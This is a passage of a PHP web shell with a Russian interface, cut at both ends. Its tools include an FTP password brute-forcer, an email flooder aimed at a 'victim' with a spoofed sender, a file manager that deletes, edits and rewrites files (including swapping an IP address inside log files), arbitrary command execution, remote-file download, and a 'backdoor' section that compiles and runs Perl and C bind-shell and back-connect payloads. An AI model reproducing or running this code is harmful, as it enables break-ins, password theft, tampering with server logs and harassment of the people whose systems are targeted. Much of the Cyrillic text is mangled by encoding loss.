ftp_close($conn_id);}
else {
echo $ftp_user_name." - error<br>";
}
}}
break;

case "ftp":

echo "
 <TABLE CELLPADDING=0 CELLSPACING=0 width=500 align=center>
 <form action='$PHP_SELF?ac=ftp' method=post><tr><td align=left valign=top colspan=3 class=pagetitle>
 <b><a href=?ac=ftppass>Проверит?на связк?login\password</a></b>
</td></tr>
 
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;FTPHost:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='host' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Login:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='login' size=50></td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Колличеств?пароле?</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='chislo' size=10> <1000 pass </td></tr>
<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Пароль для проверки:</td>
<td align=left width=350>&nbsp;&nbsp;&nbsp;
<input class='inputbox' type='text' name='proverka' size=50>
<input type='submit' value='Brut FTP' class=button1 $style_button><br><b>Ло?сохраняет? ?pass.txt</b></td></tr>


 
 </form></table>";
 
 
function s() {
   $word="qwrtypsdfghjklzxcvbnm";
   return $word[mt_rand(0,strlen($word)-1)];
}

function g() {
   $word="euioam";
   return $word[mt_rand(0,strlen($word)-2)];
}

function name0() {   return s().g().s();                        }
function name1() {   return s().g().s().g();                    }
function name2() {   return s().g().g().s();                    }
function name3() {   return s().s().g().s().g();                }
function name4() {   return g().s().g().s().g();                }
function name5() {   return g().g().s().g().s();                }
function name6() {   return g().s().s().g().s();                }
function name7() {   return s().g().g().s().g();                }
function name8() {   return s().g().s().g().g();                }
function name9() {   return s().g().s().g().s().g();            }
function name10() {   return s().g().s().s().g().s().s();        }
function name11() {   return s().g().s().s().g().s().s().g();        }

$cool=array(1,2,3,4,5,6,7,8,9,10,99,100,111,111111,666,1978,1979,1980,1981,1982,1983,1984,1985,1986,1987,1988,1989,1990,1991,1992,1993,1994,1995,1996,1997,1998,1999,2000,2001,2002,2003,2004,2005);
$cool2=array('q1w2e3','qwerty','qwerty111111','123456','1234567890','0987654321','asdfg','zxcvbnm','qazwsx','q1e3r4w2','q1r4e3w2','1q2w3e','1q3e2w','poiuytrewq','lkjhgfdsa','mnbvcxz','asdf','root','admin','admin123','lamer123','admin123456','administrator','administrator123','q1w2e3r4t5','root123','microsoft','muther','hacker','hackers','cracker');

function randword() {
   global $cool;
   $func="name".mt_rand(0,11);
   $func2="name".mt_rand(0,11);
   switch (mt_rand(0,11)) {
      case 0: return $func().mt_rand(5,99);
      case 1: return $func()."-".$func2();
      case 2: return $func().$cool[mt_rand(0,count($cool)-1)];
      case 3: return $func()."!".$func();
      case 4: return randpass(mt_rand(5,12));
      default: return $func();
   }
 
 
}

function randpass($len) {
   $word="qwertyuiopasdfghjklzxcvbnm1234567890";
   $s="";
   for ($i=0; $i<$len; $i++) {
      $s.=$word[mt_rand(0,strlen($word)-1)];
   }
   return $s;
}
if (@unlink("pass.txt") < 0){
echo "нету ничего";
exit;
}
$file="pass.txt"; 
if($file && $host && $login){
   $cn=mt_rand(30,30);
for ($i=0; $i<$cn; $i++) {
   $s=$cool2[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$s\n");
   }
 
  $cnt2=mt_rand(43,43);
for ($i=0; $i<$cnt2; $i++) {
   $r=$cool[$i];
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$login$r\n");
}    
$p="$proverka";
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$p\n");
   
 $cnt3=mt_rand($chislo,$chislo);
   for ($i=0; $i<$cnt3; $i++) {
   $u=randword();
   $f=@fopen(pass.".txt","a+");
   fputs($f,"$u\n");
  } 
  
  if(is_file($file)){
 $passwd=file($file,1000);
  for($i=0; $i<count($passwd); $i++){
   $stop=false;
   $password=trim($passwd[$i]);
   $open_ftp=@fsockopen($host,21);
    if($open_ftp!=false){
     fputs($open_ftp,"user $login\n");
     fputs($open_ftp,"pass $password\n");
     while(!feof($open_ftp) && $stop!=true){
      $text=fgets($open_ftp,4096);
      if(preg_match("/230/",$text)){
       $stop=true;
	   $f=@fopen($host._ftp,"a+");
       fputs($f,"Enter on ftp:\nFTPhosting:\t$host\nLogin:\t$login\nPassword:\t$password\n ");

       echo "
	   	<TABLE CELLPADDING=0 CELLSPACING=0 width=500 align=center>
<tr><td align=center class=pagetitle><b><font color=\"blue\">Поздравля?!! Пароль подобран.</font></b><br>
&nbsp;&nbsp;Конект: <b>$host</b><br>&nbsp;&nbsp;Логи? <b>$login</b><br>&nbsp;&nbsp;Пароль: <b>$password</b></td></tr></table>
";exit;
      }
      elseif(preg_match("/530/",$text)){
       $stop=true;
      
      }
     }
     fclose($open_ftp);
   }else{
    echo "
	<TABLE CELLPADDING=0 CELLSPACING=0  width=500 align=center>
<tr><td align=center class=pagetitle bgcolor=#FF0000><b>Не верн?указан?фт?хостинга!!! На <b><u>$host</u></b> закрыт 21 порт</b></b></td></tr>
</table>
";exit;
   }
  }
 }
}


break;
// SQL Attack
case "sql":

break;






// MailFlud
case "mailfluder":

$email=$_POST['email']; // Мыло жертвы
$from=$_POST['from']; // Мыло жертвы
$num=$_POST['num']; // Числ?писе?$text=$_POST['text']; // Текс?флуд?$kb=$_POST['kb']; // Ве?письма (kb)
?>
<script language="JavaScript"><!--
function reset_form() {
document.forms[0].elements[0].value="";
document.forms[0].elements[1].value="";
document.forms[0].elements[2].value="";
document.forms[0].elements[3].value="";
document.forms[0].elements[4].value="";
}
//--></script>
<?php
if (($email!="" and isset($email)) and ($num!="" and isset($num)) and ($text!="" and isset($text)) and ($kb!="" and isset($kb))) {

$num_text=strlen($text)+1; // Опреде?ет длинну текста + 1 (пробел ?конц?
$num_kb=(1024/$num_text)*$kb;
$num_kb=ceil($num_kb);

for ($i=1; $i<=$num_kb; $i++) {
$msg=$msg.$text." ";
}

for ($i=1; $i<=$num; $i++) {
mail($email, $text, $msg, "From: $from");
}

$all_kb=$num*$kb;

echo <<<EOF
<p align="center">Жертва: <b>$email</b><br>
Ко?во писе? <b>$num</b><br>
Общи?посланны?объе? <b>$all_kb kb</b><br></p>
EOF;

}

else {

echo <<<EOF
<form action="?ac=mailfluder" method="post">
<table align="center" border="0" bordercolor="#000000">
<tr><td>Мыло жертвы</td><td><input type="text" name="email" value="to@mail.com" size="25"></td></tr>
<tr><td>От мыла</td><td><input type="text" name="from" value="sypport@mail.com" size="25"></td></tr>
<tr><td>Числ?писе?/td><td><input type="text" name="num" value="5" size="25"></td></tr>
<tr><td>Текс?флуд?/td><td><input type="text" name="text" value="fack fack fack" size="25"></td></tr>
<tr><td>Ве?письма (kb)</td><td><input type="text" name="kb" value="10" size="25"></td></tr>
<tr><td colspan="2" align="center"><input type="submit">&nbsp;&nbsp;<input type="button" onclick="reset_form()" value="Reset"></td></tr>
</table>
</form>
EOF;

}
break;

case "tar":
# архивация директории
$fullpath = $d."/".$tar;
/* задаем рандомны?назван? файлов архиваци?/
$CHARS = "abcdefghijklmnopqrstuvwxyz";
for ($i=0; $i<6; $i++)  $charsname .= $CHARS[rand(0,strlen($CHARS)-1)];
 echo "<br>
Катало?<u><b>$fullpath</b></u>  ".exec("tar -zc $fullpath -f $charsname.tar.gz")."упакован ?файл <u>$charsname.tar.gz</u>";



echo "

<form action='?ac=tar' method='post'>
<tr><td align=center colspan=2 class=pagetitle><b>Архивация <u>$name.tar.gz</u>:</b></td></tr>
<tr>
<td valign=top><input type=text name=archive size=90 class='inputbox'value='tar -zc /home/$name$http_public -f $name.tar.gz' ></td>
<td valign=top><input type=submit value='Дави'></td>
</tr></form>";

exec($archive);

break;


// Навигация
case "navigation":
 // Пошл?навигация
$mymenu = "  [<a href='$php_self?ac=navigation&d=$d&e=$e&delete=1'>Удалит?/a>] [<a href='$php_self?ac=navigation&d=$d&ef=$e&edit=1'>Редактироват?/a>] [<a href='$php_self?ac=navigation&d=$d&e=$e&clean=1'>Очистить</a>] [<a href='$php_self?ac=navigation&d=$d&e=$e&replace=1'>Заменить текс?/a>] [<a href='$php_self?ac=navigation&d=$d&download=$e'>Загрузит?/a>]  [<a href='$php_self?ac=navigation&d=$d&infofile=$e'>Информац?</a>]<br>";

$images=array(".gif",".jpg",".png",".bmp",".jpeg");
$whereme=getcwd();
@$d=@$_GET['d'];
$copyr = "<center>";
$php_self=@$_SERVER['PHP_SELF'];
if(@eregi("/",$whereme)){$os="unix";}
if(!isset($d)){$d=$whereme;}
$d=str_replace("\\","/",$d);



$expl=explode("/",$d);
$coun=count($expl);
if($os=="unix"){echo "<a href='$php_self?ac=navigation&d=/'>/</a>";}
else{
        echo "<a href='$php_self?ac=navigation&d=$expl[0]'>$expl[0]/</a>";}
for($i=1; $i<$coun; $i++){
        @$xx.=$expl[$i]."/";
$sls="<a href='$php_self?ac=navigation&d=$expl[0]/$xx'>$expl[$i]</a>/";
$sls=str_replace("//","/",$sls);
$sls=str_replace("/'></a>/","/'></a>",$sls);
print $sls;
}
echo "</td></tr>";
echo "<br><td><b>id:</b> ".@exec('id')."</td></tr";


if(@$_GET['deldir']=="1"){

@$dir=$_GET['d'];
function deldir($d)
{
$handle = @opendir($d);
while (false!==($ff = @readdir($handle))){
if($ff != "." && $ff != ".."){
if(@is_dir("$d/$ff")){
deldir("$d/$ff");
}else{
@unlink("$d/$ff");
}}}
@closedir($handle);
if(@rmdir($d)){
@$success = true;}
return @$success;
}
$dir=@$d;
deldir($d);

$rback=$_GET['rback'];
@$rback=explode("/",$rback);
$crb=count($rback);
for($i=0; $i<$crb-1; $i++){
        @$x.=$rback[$i]."/";
}
echo "<br><b>Катало?удален !</b>";
echo $copyr;
exit;}
if(@$_GET['replace']=="1"){
$ip=@$_SERVER['REMOTE_ADDR'];
$d=$_GET['d'];
$e=$_GET['e'];
@$de=$d."/".$e;
$de=str_replace("//","/",$de);
$e=@$e;
echo $mymenu ;
echo "
Средство замены:<br>
(Ты може?заме?ть любо?текс?<br>
Файл: $de<br>
<form method=post>
1. Твой IP.<br>
2. microsoft.com IP :)<br>
Заме?ть эт?<input name=this size=30 value=$ip> этим <input name=bythis size=30 value=207.46.245.156>
<input type=submit name=doit value=Заменить>
</form>
";

if(@$_POST['doit']){

$filename="$d/$e";
$fd = @fopen ($filename, "r");
$rpl = @fread ($fd, @filesize ($filename));
$re=str_replace("$this","$bythis",$rpl);
$x=@fopen("$d/$e","w");
@fwrite($x,"$re");
echo "<br><center>$this Заменено на $bythis<br>
[<a href='$php_self?ac=navigation&d=$d&e=$e'>Посмотреть файл</a>]<br><br><Br>";

}
echo $copyr;
exit;}




if(@$_GET['yes']=="yes"){
$d=@$_GET['d']; $e=@$_GET['e'];
unlink($d."/".$e);
$delresult="Удалил $d/$e не парся ! <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?ac=navigation&d=$d\">";
}
if(@$_GET['clean']=="1"){
@$e=$_GET['e'];
$x=fopen("$d/$e","w");
fwrite($x,"");
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=".@$e."\">";
exit;
}


if(@$_GET['e']){
$d=@$_GET['d'];
$e=@$_GET['e'];
$pinf=pathinfo($e);
if(in_array(".".@$pinf['extension'],$images)){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=$e&img=1\">";
exit;}
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$e;
$de=str_replace("//","/",$de);
if(is_file($de)){
if(!is_writable($de)){echo "<font color=red><br><b>ТОЛЬКО ЧТЕНИЕ</b></font><br>";}}
echo $mymenu ;
echo "
Содержимое файл?<br>
$de
<br>
<table width=100% border=1 cellpadding=0 cellspacing=0>
<tr><td><pre>
$c

</pre></td></tr>
</table>";
if(@$_GET['delete']=="1"){
$delete=$_GET['delete'];
echo "
Удаление: Ты уверен ?<br>
<a href=\"$php_self?ac=navigation&d=$d&e=$e&delete=".@$delete."&yes=yes\">Да</a> || <a href='$php_self?no=1'>Не?/a>
<br>
";
if(@$_GET['yes']=="yes"){
@$d=$_GET['d']; @$e=$_GET['e'];
echo $delresult;
}
if(@$_GET['no']){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=$e\">
";
}


} #end of delete
echo $copyr;
exit;
} #end of e

if(@$_GET['edit']=="1"){
@$d=$_GET['d'];
@$ef=$_GET['ef'];
if(is_file($d."/".$ef)){
if(!is_writable($d."/".$ef)){echo "<font color=red><br><b>ТОЛЬКО ЧТЕНИЕ</b></font><br>";}}
echo $mymenu ;
$filename="$d/$ef";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$ef;
$de=str_replace("//","/",$de);
echo "
Редактирование:<br>
$de<br>
<form method=post>
<input type=HIDDEN name=filename value='$d/$ef'>
<textarea cols=143 rows=30 name=editf>$c</textarea>
<br>
<input type=submit name=save value='Сохранит?измения'></form><br>

";
if(@$_POST['save']){
$editf=@$_POST['editf'];
$editf=stripslashes($editf);
$f=fopen($filename,"w+");
fwrite($f,"$editf");
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=$ef\">";
exit;
}
 
exit;
}



echo"
<table width=100% cellpadding=1 cellspacing=0 class=hack>
<a href='?ac=tar&d=$d' title='Архивация произойдет только пр?наличи?прав записи ?катало?!'><b>[Архивация каталога] </b></a>
<a href='?ac=tar&as=mail&d=$d' title='Происходит архивация каталога + отправка архива на ва?e-mail ! ?ция не доступна ?0.5?версии!'><b>[Архивация каталога + Отправка на ?mail] </b></a>
<a href='?ac=navigation&d=$d&deldir=1' title='Полное удаление каталога !\n Спрашивать подтверждения те? никт?не буде?:)'><b>[Удаление каталога] </b></a>
<tr><td bgcolor=#4d9ef0><center><b>Название</b></td><td bgcolor=#4d9ef0><b>Размер</b></td><td bgcolor=#4d9ef0><b>Доступ</b></td></tr>
";
$dirs=array();
$files=array();
$dh = @opendir($d) or die("<table width=100%><tr><td><center>Катало?не существует ил?доступ ?нему запрещен !</center><br>$copyr</td></tr></table>");
while (!(($file = readdir($dh)) === false)) {
if ($file=="." || $file=="..") continue;
if (@is_dir("$d/$file")) {
      $dirs[]=$file;
}else{
      $files[]=$file;
      }
   sort($dirs);
   sort($files);

$fz=@filesize("$d/$file");
}

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}
for ($i=0;$i<sizeof($dirs);$i++) {
   if ($dirs[$i] != "..") {


if(is_writable($dirs[$i])){$info="<font color=green><li>&nbsp;W</font>";}
else{$info="<font color=red><li>&nbsp;R</font>";}
$perms = @fileperms($d."/".$dirs[$i]);
$owner = @fileowner($d."/".$dirs[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$dirs[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#aed7ff";}else{$color="#68adf2";}
$linkd="<a href='$php_self?ac=navigation&d=$d/$dirs[$i]'>$dirs[$i]</a>";
$linkd=str_replace("//","/",$linkd);
echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color>$info</td></tr>";
}
}
for ($i=0;$i<sizeof($files);$i++) {
if(is_writable($files[$i])){$info="<font color=green><li>&nbsp;W</font>";}
else{$info="<font color=red><li>&nbsp;R</font>";}
$size=@filesize($d."/".$files[$i]);
$perms = @fileperms($d."/".$files[$i]);
$owner = @fileowner($d."/".$files[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$files[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$prava=perm($perms);
if($i%2){$color="#ccccff";}else{$color="#b0b0ff";}

if ($size < 1024){$siz=$size.' b';
}else{
if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
}}}
echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?ac=navigation&d=$d&e=$files[$i]'title='Доступ $prava. Владелец $owner/$group'>$files[$i]</a></td><td bgcolor=$color>$siz</td><td bgcolor=$color>$prava</td></tr>";
}

echo "</table></td></tr></table>";
break;
// Установк?бекдор?case "backconnect":
echo "<b>Установк?бекдор?/ открытие порт?/b>";
echo "<form name=bind method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>Открыт?порт </b>";
echo "<input type=text name=port size=15 value=11457>&nbsp;";
echo "<b>Пароль для доступ?</b>";
echo "<input type=text name=bind_pass size=15 value=nrws>&nbsp;";
echo "<b>Использовать </b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=Открыт?";
echo "</font>";
echo "</form>";

echo "<b>Установк?бекдор?/ бекконнект</b>";
echo "<form name=back method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>IP-адре?</b>";
echo "<input type=text name=ip size=15 value=127.0.0.1>&nbsp;";
echo "<b>Порт </b>";
echo "<input type=text name=port size=15 value=31337>&nbsp;";
echo "<b>Использовать </b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=Выполнит?";
echo "</font>";
echo "</form>";


/* port bind C */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 $w_file=fopen("/tmp/bd.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/bd.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/bd /tmp/bd.c");
 unlink("/tmp/bd.c");
 $bind_string="/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &";
 $blah=exec($bind_string);
 $_POST['cmd']="ps -aux | grep bd";
 $err=0;
 }
}

/* port bind Perl */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 $w_file=fopen("/tmp/bdpl","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Ошибка! Не могу записать ?/tmp/</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_pl));
 fclose($w_file);
 $bind_string="perl /tmp/bdpl ".$_POST['port']." &";
 $blah=exec($bind_string);
 $_POST['cmd']="ps -aux | grep bdpl";
 $err=0;
 }
}

/* back connect Perl */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 $w_file=fopen("/tmp/back","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Ошибка! Не могу записать ?/tmp/</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect));
 fclose($w_file);
 $bc_string="perl /tmp/back ".$_POST['ip']." ".$_POST['port']." &";
 $blah=exec($bc_string);
 $_POST['cmd']="echo \"Сейчас скрипт коннектится ?".$_POST['ip']." port ".$_POST['port']." ...\"";
 $err=0;
 }
}

/* back connect C */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 $w_file=fopen("/tmp/back.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>Error! Can't write in /tmp/back.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/backc /tmp/back.c");
 unlink("/tmp/back.c");
 $bc_string="/tmp/backc ".$_POST['ip']." ".$_POST['port']." &";
 $blah=exec($bc_string);
 $_POST['cmd']="echo \"Сейчас скрипт коннектится ?".$_POST['ip']." port ".$_POST['port']." ...\"";
 $err=0;
 }
}
echo "<font face=Verdana size=-2>Выполненная команд? <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<br>Результа? ";
echo "<font color=red size=2";
print "".passthru($_POST['cmd'])."";
echo "</font></b>";
break;

// Uploading
case "upload":

echo <<<HTML
<b>Загрузка файлов</b>
<a href='$php_self?ac=massupload&d=$d&t=massupload'>* Загрузит?большо?количество файлов *</a><br><br>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td>Файл:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>Папк?</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="Послат?></td><br>
$tend
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "Файл успешн?загружен ?папк?$uploadfile\n";
    echo "Имя:" .$_FILES['file']['name']. "\n";
    echo "Размер:" .$_FILES['file']['size']. "\n";

} else {
    print "Не удаётся загрузит?файл. Инфа:\n";
    print_r($_FILES);
}
}


echo "<form enctype='multipart/form-data' action='?ac=upload&status=ok' method=post>
<b>Загрузка файлов ?удаленного компьютера:</b><br>
 HTTP путь ?файл? <br>
<input type='text' name='file3' value='http://' size=40><br>
Название файл?ил?путь ?название?файл? <br>
<input type='text' name='file2' value='$docr/' size=40><br>
<input type='submit' value='Загрузит?файл'></form>";


if (!isset($status)) downfiles();

else
{

$data = @implode("", file($file3));
$fp = @fopen($file2, "wb");
@fputs($fp, $data);
$ok = @fclose($fp);
if($ok)
{
$size = filesize($file2)/1024;
$sizef = sprintf("%.2f", $size);

print "<br><center>Вы загрузил? <b>файл <u>$file2</u> размером</b> (".$sizef."кБ) </center>";
}
else
{
print "<br><center><font color=red  size = 2><b>Ошибка загрузки файл?/b></font></center>";
}
}



break;
// Tools
case "tools":
echo "<form method=post>Генерация md5 шифр?br><input name=md5 size=30></form><br>";
@$md5=@$_POST['md5'];
if(@$_POST['md5']){ echo "md5 сгенерирован:<br> ".md5($md5)."";}
echo "<br>
<form method=post>Кодировани?декодировани?base64<br><input name=base64 size=30></form><br>";
if(@$_POST['base64']){
@$base64=$_POST['base64'];
echo "
Кодировано:<br><textarea rows=8 cols=80>".base64_encode($base64)."</textarea><br>
Декодировано: <br><textarea rows=8 cols=80>".base64_decode($base64)."</textarea><br>";}
echo "<br>
<form method=post>DES кодировани?<br><input name=des size=30></form><br>";
if(@$_POST['des']){
@$des=@$_POST['des'];
echo "Des сгенерирован: <br>".crypt($des)."";}
echo "<br>
<form method=post>SHA1 кодировани?<br><input name=sha1 size=30></form><br>";
if(@$_POST['sha1']){
@$des=@$_POST['sha1'];
echo "SHA1 сгенерирован: <br>".sha1($sha1a)."";}

echo "<form method=POST>";
echo "html-ко?-> шестнадцатиричны?значен?<br><input type=text name=data size=30>";


if (isset($_POST['data']))
{
echo "<br><br><b>Результа?<br></b>";
$str=str_replace("%20","",$_POST['data']);
for($i=0;$i<strlen($str);$i++)
{
$hex=dechex(ord($str[$i]));
if ($str[$i]=='&') echo "$str[$i]";
else if ($str[$i]!='\\') echo "%$hex";
}
}
exit;
break;
// Mass Uploading
case "massupload":


echo "
Масовая загрузка файлов:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
<input name=where size=43 value='$docr'><br>
<input type=submit value=Загрузит?name=massupload>
</form><br>";

if(@$_POST['massupload']){
$where=@$_POST['where'];
$uploadfile1 = "$where/".@$_FILES['text1']['name'];
$uploadfile2 = "$where/".@$_FILES['text2']['name'];
$uploadfile3 = "$where/".@$_FILES['text3']['name'];
$uploadfile4 = "$where/".@$_FILES['text4']['name'];
$uploadfile5 = "$where/".@$_FILES['text5']['name'];
$uploadfile6 = "$where/".@$_FILES['text6']['name'];
$uploadfile7 = "$where/".@$_FILES['text7']['name'];
$uploadfile8 = "$where/".@$_FILES['text8']['name'];
$uploadfile9 = "$where/".@$_FILES['text9']['name'];
$uploadfile10 = "$where/".@$_FILES['text10']['name'];
$uploadfile11 = "$where/".@$_FILES['text11']['name'];
$uploadfile12 = "$where/".@$_FILES['text12']['name'];
$uploadfile13 = "$where/".@$_FILES['text13']['name'];
$uploadfile14 = "$where/".@$_FILES['text14']['name'];
$uploadfile15 = "$where/".@$_FILES['text15']['name'];
$uploadfile16 = "$where/".@$_FILES['text16']['name'];
$uploadfile17 = "$where/".@$_FILES['text17']['name'];
$uploadfile18 = "$where/".@$_FILES['text18']['name'];
$uploadfile19 = "$where/".@$_FILES['text19']['name'];
$uploadfile20 = "$where/".@$_FILES['text20']['name'];
if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile1</i><br>";}
if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile2</i><br>";}
if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile3</i><br>";}
if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile4</i><br>";}
if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile5</i><br>";}
if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile6</i><br>";}
if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile7</i><br>";}
if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile8</i><br>";}
if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile9</i><br>";}
if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile10</i><br>";}
if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile11</i><br>";}
if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile12</i><br>";}
if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile13</i><br>";}
if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile14</i><br>";}
if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile15</i><br>";}
